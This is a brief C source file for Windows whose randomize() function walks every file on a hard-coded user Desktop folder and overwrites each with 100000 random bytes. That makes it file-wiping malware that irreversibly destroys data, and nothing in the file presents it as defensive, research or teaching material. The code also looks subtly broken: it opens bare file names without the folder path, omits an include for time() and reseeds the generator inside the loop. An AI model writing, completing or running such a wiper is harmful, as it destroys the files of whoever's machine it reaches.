#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "proto.h"

void randomize(){

WIN32_FIND_DATA FindFileData;
        HANDLE hFind = FindFirstFile("C:\\Users\\a\\Desktop\\*", &FindFileData);
        if (hFind != INVALID_HANDLE_VALUE)
        {
            do
            {
                if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                {
                    continue;
                }
                else
                {
                    FILE *file;
                    file = fopen(FindFileData.cFileName, "wb");
                    srand(time(NULL));
                    for (int i = 0; i < 100000; i++)
                    {
                        int random = rand() % 255;
                        fputc(random, file);
                    }
                    fclose(file);
                }
            } while (FindNextFile(hFind, &FindFileData) != 0);
            FindClose(hFind);
        }

}

